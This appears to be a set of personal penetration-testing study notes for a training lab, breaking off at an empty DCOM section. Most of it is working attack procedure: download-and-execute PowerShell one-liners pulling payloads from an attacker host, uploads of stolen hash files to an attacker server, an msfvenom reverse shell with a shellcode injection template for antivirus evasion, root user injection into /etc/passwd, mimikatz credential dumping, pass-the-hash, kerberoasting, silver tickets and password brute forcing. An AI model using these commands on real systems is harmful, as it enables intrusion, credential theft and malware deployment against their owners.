Scan for services with `sudo nmap 10.11.0.128 -p- -sV -A -vv --open --reason` then search for possible exploits on the services, etc.
    
## Fixing Exploits

Cross-compiler for compiling (e.g. `C`) coded memory corruption exploits
```
sudo apt install mingw-w64
```
    
Web Exploits
- To avoid SSL verification (`python` library), set the `verify` perimeter to `False`, e.g.
```
response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
```

**Remember to fix exploits if used, amending the required variables. Refer to Chapter 15**
    
---
    
## File Transfers (Post-Exploitation)
Transferring attack tools might be needed, but it has its risks.

### Linux Hosts
After connecting to our listening port, we can upgrade our non-interactive shell through `pty`
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Windows Hosts
Some Windows tools can be found in `/usr/share/windows-resources/binaries/`. 
    
#### Non-interactive FTP Download    
Copy them into `ftphome`:
```
sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
```
    
Build a text file of FTP commands in the Windows shell:
```
echo open 10.11.0.4 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```
And initiate the FTP session to our FTP server:
```
ftp -v -n -s:ftp.txt
```

`nc.exe` should be downloaded to the current directory and it can be run.

You may want to transfer in binary mode using `binary` if it doesn't work.

#### Download Using Scripting Languages
`wget.vbs` script pasted into remote shell to write a script to act as a HTTP downloader:
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo  http.Open "GET", strURL, False >> wget.vbs
echo  http.Send >> wget.vbs
echo  varByteArray = http.ResponseBody >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo  strData = "" >> wget.vbs
echo  strBuffer = "" >> wget.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs
```

We can run this script using `cscript` to download files from our machine:
```
cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

PowerShell can be used as well:
```
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
First, we must allow execution of PowerShell scripts (which is restricted by default) with the -ExecutionPolicy keyword and Bypass value. Next, we will use -NoLogo and -NonInteractive to hide the PowerShell logo banner and suppress the interactive PowerShell prompt, respectively. The -NoProfile keyword will prevent PowerShell from loading the default profile (which is not needed), and finally we specify the script file with -File:
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```
Or we can also execute this script as a one-liner:
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.159/mimi32.exe', 'mimi32.exe')
```
To download and execute a PowerShell script without it saving to disk:
```
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
```
#### Download Using exe2hex and PowerShell
Compressing binary files:
```
upx -9 nc.exe
```
Convert binary file to a Windows script (`.cmd`) to run it on the Windows host. Convert the file to hex:
```
exe2hex -x nc.exe -p nc.cmd
```
Once downloaded and run in PowerShell, the binary file should be built. 

#### Upload Using Scripting Languages
`upload.php` to be saved in `/var/www/html`
```
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```
Create the `uploads` folder and modify its permissions, granting the `www-data` user ownership and subsequent write permissions:
```
sudo mkdir /var/www/uploads
ps -ef | grep apache
sudo chown www-data: /var/www/uploads
ls -la
```
On Windows, upload the file in PowerShell:
```
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.197/upload.php', 'kerb-Hash0.txt')
```
#### Uploading Files with TFTP
*Usually if no PowerShell (old Windows systems)
Not installed by default on Kali. Install and configure:
```
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```
On Windows, initiate the upload:
```
tftp -i 10.11.0.4 put important.docx
```
#### Download by Hosting on Kali
Start `apache2` with `sudo systemctl start apache2` and upload the file into `/var/www/html`. Victim machine to access `<kali IP>/file name`.

Can also start a HTTP server using `sudo python3 -m http.server 80`. This option allows for logging to appear in the shell.

## Antivirus Evasion
### In-Memory Injection
Basic template
```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
For your shellcode, can use `msfvenom`:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
```
Might have to change execution policy:
```
powershell
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Get-ExecutionPolicy -Scope CurrentUser
```

### Shellter
```
sudo apt install shellter
apt install wine
```
Refer to PDF.
    
## Privilege Escalation

### Information Gathering
#### Manual Enumeration
****Windows****
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
- `systeminfo` to gather basic information about the system
- `whoami` displays the username the shell is running as (`whoami /priv` to check the current user's permissions)
- We can pass the discovered username as an argument to `net user` (e.g. `net user student`)
- Simply using `net user` will discover other user accounts on the system`
- `hostname` to enumerate the machine's hostname
- OS Ver and Architecture: 
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
- Running Processes and Services: `tasklist /SVC`, `wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"`
**Note:** When a service is created whose executable path contains spaces and isn't enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges
- Permissions: `icacls "<directory>"`
**Note:** A quick Google search for "elevate privileges SeImpersonate" allows us to discover an exploit with the name of "Juicy Potato". 

https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505

The first required flag `-t` is the "Process creation mode". The documentation states that we need `CreateProcessWithToken` if we have the `SeImpersonate` privilege, which we do. To direct Juicy Potato to use `CreateProcessWithToken`, we will pass the `t` value.

Next, the `-p` flag specifies the program we are trying to run. In this case, we can use the same backdoored `whoami.exe` binary that we used previously.

Finally, Juicy Potato allows us to specify an arbitrary port for the COM server to listen on with the `-l` flag.

- Networking Interfaces: `ipconfig /all`
- Routing Tables: `route print`
- Active Connections: `netstat -ano`, `netstat -tulnp`
- Firewall Status and Rules: 
```
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```
- Scheduled Tasks: `schtasks /query /fo LIST /v`
- Installed Applications and Patch Levels: `wmic product get name, version, vendor`, `wmic qfe get Caption, Description, HotFixID, InstalledOn`
- Readable/Writable Files and Directories: `accesschk.exe -uws "Everyone" "C:\Program Files"` or in PowerShell `Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`
    - https://sohvaxus.github.io/content/winxp-sp1-privesc.html
- Unmounted Disks: `mountvol`
- Device Drivers and Kernel Modules: PowerShell `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path` and `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}`
- Binaries that AutoElevate: Check the registry settings:
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```
If this setting is enabled, we could craft an MSI file and run it to elevate our privileges.

**Linux**
https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- Use `id` to gather user context information (e.g. what groups they are a part of)
- `cat /etc/passwd` to enumerate users
    - `www-data` indicates a web server is likely installed
    - Check if `/etc/passwd`'s permissions are set correctly. If incorrect (`rwx` for "Other Users"), add in your own user. 
```
ls -l /etc/passwd

openssl passwd evil
<HASH>

echo "root2:<HASH>:root:/root:/bin/bash" >> /etc/passwd

su root2
```
- `hostname` to enumerate the machine's hostname
- OS Ver and Architecture: 
```
cat /etc/issue
cat /etc/*-release

AND

uname -a
```
- Running Processes and Services: `ps axu`
- Networking Interfaces: `ip a`
- Routing Tables: `/sbin/route` or `/sbin/routel`
- Active Connections: `netstat` or `ss -anp`
- Firewall Status and Rules: Requires `root`, and command `iptables`. However, depending on how the firewall is configured, we may be able to glean information about the rules as a standard user. Refer to PDF.
- Scheduled Tasks: `ls -lah /etc/cron*` or `cat /etc/crontab`
    - Also can use `grep "CRON" /var/log/cron.log` for running cron jobs
- Installed Applications and Patch Levels: `dpkg -l`
- Readable/Writable Files and Directories: `find / -writable -type d 2>/dev/null`
- Unmounted Disks: `mount` or `cat /etc/fstab` to list files mounted at boot time. `/bin/lsblk` to view all available disks.
- Device Drivers and Kernel Modules: `lsmod`, and `/sbin/modinfo XX` to find out more about the specific module
- Binaries that AutoElevate: Search for SUID files: `find / -perm -u=s -type f 2>/dev/null` (Normally, when running an executable, it inherits the permissions of the user that runs it. However, if the SUID permissions are set, the binary will run with the permissions of the file owner. This means that if a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges.)
    - You can check how to exploit the binary in Google/GTFOBins
    - If `/bin/cp` has SUID, can use to make a new user in `/etc/passwd` 		(https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/)
    - `ls -al /usr/bin/<BINARY> ` to check on permissions of the binary 
    - When in doubt, if `pkexec` has SUID binary set, can probably use `PwnKit` (https://github.com/ly4k/PwnKit), or if you have user authentication, you can escalate
- Check for `ssh` permissions - who can login via `ssh`: `grep -v '^#' /etc/ssh/sshd_config | uniq`
- If managed to login, check what groups the user is a part of: 

#### Automated Enumeration
Windows: `windows-privesc-check2.exe --dump`
Linux: `./unix-privesc-check standard > output.txt`

### Windows Privilege Escalation
- UAC bypass by editing registry
    - `fodhelper.exe` can possibly be found in `C:\Windows\sysnative`
- Exploit isecure file permissions on services that run as `nt authority\system`
- Unquoted service paths
- Kernel Vulnerabilities
- Refer to PDF

Potatoes:
`SeImpersonate` or `SeAssignPrimaryToken` privileges.
https://jlajara.gitlab.io/Potatoes_Windows_Privesc
https://github.com/ohpe/juicy-potato
Check privileges with `whoami /priv`
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
https://github.com/ohpe/juicy-potato/releases

**JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, can try PrintSpoofer, RoguePotato, SharpEfsPotato

PrintSpoofer:
https://github.com/itm4n/PrintSpoofer
`wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe`
### Linux Privilege Escalation
- Insecure file permissions
    - Cron job
        - Find out which cron job is run by root, and amend the script using `echo '<command>' > <cronfile>`
    - `/etc/passwd`
    
## Password Attacks
### Creating Wordlists
Kali has some wordlists in `/usr/share/wordlists/` directory. But it would be effective to add words and phrases specific to our target.

- `cewl` scrapes the website and locates words to be used in the wordlist.
```
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
```
- John The Ripper can be used to mutate the wordlist. Amend the `john.conf` file in `/etc/john/john.conf`
```
john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
```
- `crunch` can be used to generate password coverage as well

### Common Network Service Attack Methods
#### HTTP `htaccess` Attack with `medusa`
Initiate the attack against the htaccess-protected URL `-m DIR:/admin` on our target host with `-h 10.11.0.22`. We will attack the admin user `-u admin` with passwords from our rockyou wordlist file `-P /usr/share/wordlists/rockyou.txt` and will, of course, use an HTTP authentication scheme `-M`
```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```
`medusa -d` to show what other network protocols can be used.

#### RDP Attack with `crowbar`
Crowbar, formally known as Levye, is a network authentication cracking tool primarily designed to leverage SSH keys rather than passwords.

To invoke crowbar, we will specify the protocol `-b`, the target server `-s`, a username `-u`, a wordlist `-C`, and the number of threads `-n`.
```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
#### SSH Attack with `hydra`
The standard options include `-l` to specify the target username, `-P` to specify a wordlist, and `protocol://IP` to specify the target protocol and IP address respectively.
```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
```
#### HTTP POST Attack with `hydra`
When a HTTP POST request is used for user login, it is most often through the use of a web form, which means we should use the "http-form-post" service module.
```
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

**Note:** *For WordPress, you can consider using `wpscan`*.
```
wpscan --url sandbox.local --enumerate ap,at,cb,dbe
```
"All Plugins" `ap`, "All Themes" `at`, "Config backups" `cb`, and "Db exports" `dbe`.

### Password Hashes
#### Identifying Hashes
- `hashid` to identify hash type
- `mimikatz` to mount in-memory attacks designed to dump the Security Accounts Manager (SAM) hashes
```
C:\Tools\password_attacks\mimikatz.exe

privilege::debug

token::elevate

lsadump::sam
```
#### Passing The Hash
- `pth-winexe` to pass the hash using `SMB` protocol
Specifying the user name and hash `-U` along with the SMB share (in UNC format) and the name of the command to execute, e.g. `cmd`. We will ignore the DOMAIN parameter, and prepend the username (followed by a `%` sign) to the hash to complete the command.
```
pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```
#### Password Cracking
Performed after identifying the hashing mechanism (use `zip2john` or `rar2john` or `hashcat` to get the hash.txt and format, and running against a wordlist hashed with the hashing mechanism.

![](https://i.imgur.com/VRLCLic.png)

You might need to remove the front portion of the hash.


- You can use `john`:
```
sudo john hash.txt --format=NT
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```
```
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```
In order to crack Linux-based hashes with `john`, we need to `unshadow`:
```
unshadow passwd-file.txt shadow-file.txt
    
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

- You can also use `hashcat64.exe` which leverages CPU and GPU.

`john` hash formats: https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

## Port Redirection and Tunneling
### Port Forwarding
`RINETD` can be installed on the machine that will do the redirection
```
sudo apt update && sudo apt install rinetd

cat /etc/rinetd.conf

```
`bindaddress` and `bindport`, which define the bound ("listening") IP address and port, and `connectaddress` and `connectport`, which define the traffic's destination address and port

Restart the service after making configuration changes:
```
sudo service rinetd restart
```
Check if service is running:
```
ss -antp | grep "80"

LISTEN   0   5   0.0.0.0:80     0.0.0.0:*     users:(("rinetd",pid=1886,fd=4))
```
### SSH Tunneling

SSH port forwards can be run as non-root users as long as we only bind unused non-privileged local ports (above 1024).
    
#### SSH Local Port Forwarding
The ports are opened on the attacker machine (local).

Syntax:
```
ssh -N -L [bind_address:]port:host:hostport [username@address]
```
Example: We will not technically issue any ssh commands (`-N`) but will set up port forwarding (with `-L`), bind port 445 on our local machine (`0.0.0.0:445`) to port 445 on the Windows Server (`192.168.1.110:445`) and do this through a session to our original Linux target, logging in as student (`student@10.11.0.128`):
```
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
```
**Note**: For Windows Server 2016 it no longer supports `SMBv1` by default, so some config changes are required:

```
sudo nano /etc/samba/smb.conf

cat /etc/samba/smb.conf

min protocol = SMB2

sudo /etc/init.d/smbd restart
```

#### SSH Remote Port Forwarding
The ports are opened on remote machine (remote), allowing connections to the attacker machine.

Syntax:
```
ssh -N -R [bind_address:]port:host:hostport [username@address]
```
Example: In this case, we will ssh out to our Kali machine as the `kali` user (`kali@10.11.0.4`), specify no commands (`-N`), and a remote forward (`-R`). We will open a listener on TCP port 2221 on our Kali machine (`10.11.0.4:2221`) and forward connections to the internal Linux machine's TCP port 3306 (`127.0.0.1:3306`): 
```
ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
```
On the attacker machine, we can check that it's listening:
```
sudo nmap -sS -sV 127.0.0.1 -p 2221
```
If we were to run this command in a meterpreter shell, we would quickly run into a hurdle since we don't have a fully interactive shell. This is a problem since ssh will prompt us to accept the host key of the Kali machine and enter in the password for our Kali user. For security reasons, we want to avoid entering in our Kali password on a host we just compromised.

We can fix the first issue by passing in two optional flags to automatically accept the host key of our Kali machine. These are `UserKnownHostsFile=/dev/null` and `StrictHostKeyChecking=no`. The first option prevents `ssh` from attempting to save the host key by sending the output to `/dev/null`. The second option will instruct `ssh` to not prompt us to accept the host key. Both of these options can be set via the `-o` flag. 

Now we need to prevent ssh from asking us for a password, which we can do by using ssh keys. We will generate ssh keys on the WordPress host, configure Kali to accept a login from the newly-generated key (and only allow port forwarding), and modify the ssh command one more time to match our changes.
```
mkdir keys

cd keys

ssh-keygen

/tmp/keys/id_rsa

cat id_rsa.pub
```
This new public key needs to be entered in our Kali host's `authorized_keys` file for the kali user, but with some restrictions. To avoid potential security issues we can tighten the ssh configuration only permitting access coming from the WordPress IP address (note that this will be the NAT IP since this is what Kali will see and not the IP of the actual WordPress host).

Next, we want to ignore any commands the user supplies. This can be done with the command option in `ssh`. We also want to prevent agent and X11 forwarding with the `no-agent-forwarding` and `no-X11-forwarding` options. Finally, we want to prevent the user from being allocated a `tty` device with the `no-tty` option. Example `~/.ssh/authorized_keys` file:
```
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla
```
Final command looks like this:
```
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
```
#### SSH Dynamic Port Forwarding
Used to target additional ports or hosts without having to establish different tunnels for each port/host. `-D` to specify local dynamic SOCKS4 application-level port forwarding tunneled within SSH.
    
Syntax:
```
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
```
Example: With the above syntax in mind, we can create a local SOCKS4 application proxy (`-N -D`) on our Kali Linux machine on TCP port 8080 (`127.0.0.1:8080`), which will tunnel all incoming traffic to any host in the target network, through the compromised Linux machine, which we log into as student (`student@10.11.0.128`):
```
sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
```

On the attacker machine, we have to direct tools to use this proxy. Edit the configuration file:
```
cat /etc/proxychains.conf

socks4 127.0.0.1 8080
```
To run our tools through our SOCKS4 proxy, we prepend each command with `proxychains`.

E.g.:
```
sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
```

If you need to use Firefox, remember to set your proxychains proxy using the FoxyProxy add-on:
    
![](https://i.imgur.com/S2ZDN0H.png)

Then you can proceed to use `proxychains firefox 127.0.0.1`.
    
### PLINK.exe
Windows-based command line SSH client. Assume we have control of our Windows target and are able to transfer `plink.exe` over.

We can use plink.exe to connect via SSH (`-ssh`) to our Kali machine (`10.11.0.4`) as the `kali` user (`-l kali`) with a password of "ilak" (`-pw ilak`) to create a remote port forward (`-R`) of port 1234 (`10.11.0.4:1234`) to the MySQL port on the Windows target (`127.0.0.1:3306`) with the following command:
```
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
```
### NETSH
Assuming we have SYSTEM-level shell on Win10 machine.
    
Check that IP Helper service is running (Services) and IPv6 support is enabled for the used interface (Network Interface Settings).

Similar to the SSH local port forwarding example, we will attempt to redirect traffic destined for the compromised Windows 10 machine on TCP port 4455 to the Windows Server 2016 machine on port 445.

In this example, we will use the `netsh` (interface) context to add an IPv4-to-IPv4 (`v4tov4`) proxy (`portproxy`) listening on `10.11.0.22` (`listenaddress=10.11.0.22`), port 4455 (`listenport=4455`) that will forward to the Windows 2016 Server (`connectaddress=192.168.1.110`) on port 445 (`connectport=445`):
```
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110

netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
```
See PDF for more details.

### HTTPTunnelling

To begin building our tunnel, we will create a local SSH-based port forward between our compromised Linux machine and the Windows remote desktop target. Remember, protocol does not matter here (SSH is allowed) as this traffic is unaffected by deep packet inspection on the internal network.

To do this, we will create a local forward (`-L`) from the compromised machine (`127.0.0.1`) and will log in as student, using the new password we created post-exploitation. We will forward all requests on port 8888 (`0.0.0.0:8888`) to the Windows Server's remote desktop port (`192.168.1.110:3389`):
```
ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
```
We will set up the server (`hts`), which will listen on localhost port 1234, decapsulate the traffic from the incoming HTTP stream, and redirect it to localhost port 8888 (`--forward-port localhost:8888`) which, thanks to the previous command, is redirected to the Windows target's remote desktop port:
```
hts --forward-port localhost:8888 1234
```
On the attacker kali:
```
htc --forward-port 8080 10.11.0.128:1234
```
Do a remote desktop connection on kali to 8080.

## Active Directory Attacks
### AD Enumeration
#### `net.exe`
1. Local accounts
`net user`
2. All users in the domain
`net user /domain`
3. Particular user in the domain
`net user jeff_admin /domain`
4. All groups in the domain
`net group /domain`

Discover domain controller's hostname
```
nslookup

> set type=all
> _ldap._tcp.dc._msdcs.sandbox.local
> exit
```
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
https://wadcoms.github.io/#+SMB+No%20Creds+Enumeration+Windows

#### Powershell
```
LDAP://HostName[:PortNumber][/DistinguishedName]
```
Template to use:
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368" // can change filter

$Result = $Searcher.FindAll()

Foreach($obj in $Result) // can also be changed
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}
```
Above template can be used to enumerate other information like nested groups or service principal names (see PDF).

### AD Authentication
#### Cached Credential Storage and Retrieval
Needs local admin (SYSTEM).

Run `mimikatz6` and enter `privilege::debug` to engage the `SeDebugPrivlege7` privilege, which will allow us to interact with a process owned by another account.

Finally, we'll run `sekurlsa::logonpasswords` to dump the credentials of all logged-on users using the `Sekurlsa8` module.

```
mimikatz.exe

privilege::debug

sekurlsa::logonpasswords
```
	
Can also try the following:
```
sekurlsa::logonpasswords
vault::cred /patch
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
```
	
Show the Offsec user's tickets that are stored in memory with `sekurlsa::tickets`. Stealing a TGS would allow us to access only particular resources associated with those tickets. On the other side, armed with a TGT ticket, we could request a TGS for specific resources we want to target within the domain.

#### Service Account Attacks
Use the `Add-Type` cmdlet: E.g. SPN for IIS web server in the domain
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'DC01/Allison.offsec.local:5999'
```
We can then use `klist` to display all cached Kerberos tickets for the current user. Then we can use Mimikatz to download the service ticket from memory.
```
mimikatz # kerberos::list /export
```
Use `kerberoast` to brute force the hash:
```
sudo apt update && sudo apt install kerberoast

python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

**Note:** A faster way is to use `Invoke-Kerberos.ps1`. Run the script (https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1).

```
powershell –ExecutionPolicy Bypass

Import-Module .\Invoke-Kerberoast.ps1

Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt
```
Transfer the `txt` file to your Kali and use `hashcat` or whatever tools to crack it.
```
hashcat -m 13100 --force <TGSs_file> <wordlist>
```

#### Low and Slow Password Guessing
Check out the domain's account policy with `net accounts`. 

We can use an existing implementation (https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1). We can submit a wordlist file with `-File` and test admin accounts with `-Admin`.
```
.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
```

**Note**: You may use `impacket-psexec` to login with any credentials that you have obtained. E.g. if you have obtained SPN hash for a SQL server, this command would work:
```
impacket-psexec sqlserver:<password>@<IP>

impacket-psexec -hashes <lmhash/MsCachev2>:<NTLM> <user>@10.11.1.122
```
`MsCachev2` can be obtained by executing `lsadump::cache` in `mimikatz`.
	
### AD Lateral Movement
#### Pass The Hash
Only for NTLM authentication.
```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

**Note:** You may use `impackets-secretsdump` to directly login and dump the SAM hashes and thereafter use `impackets-psexec` to login with the hash. E.g.:
```
impacket-secretsdump offsec.local/Allison@192.168.159.57
.
.
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5:::
.
.
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 offsec.local/Administrator@192.168.159.57
```

#### Overpass The Hash
The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. 
```
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
```
Generate Kerberos TGT by authenticaating to a network share on the domain controller with `net use`:
```
net use \\dc01
```
Now we can use any tools that rely on Kerberos authentication. E.g.`PsExec.exe`
```
PS: .\PsExec.exe \\dc01 cmd.exe
```
#### Pass The Ticket
If the service account is not a local administrator on any servers, we would not be able to perform lateral movement using vectors such as pass the hash or overpass the hash and therefore, in these cases, we would need to use a different approach.

Obtain SID of current user:
```
whoami /user
```
The silver ticket command requires a username (`/user`), domain name (`/domain`), the domain SID (`/sid`), which is highlighted above, the fully qualified host name of the service (`/target`), the service type (`/service:HTTP`), and the password hash of the iis_service service account (`/rc4`). The generated silver ticket is injected directly into memory with the `/ptt` flag.
```
mimikatz #

kerberos::purge

kerberos::list

kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

kerberos::list
```
#### Distributed Component Object Model
DCOM objects related to Microsoft Office allow lateral movement, both through the use of Outlook7 as well as PowerPoint.8 Since this requires the presence of Microsoft Office on the target computer, this lateral movement technique is best leveraged against workstations. 

Template PowerShell script:
```
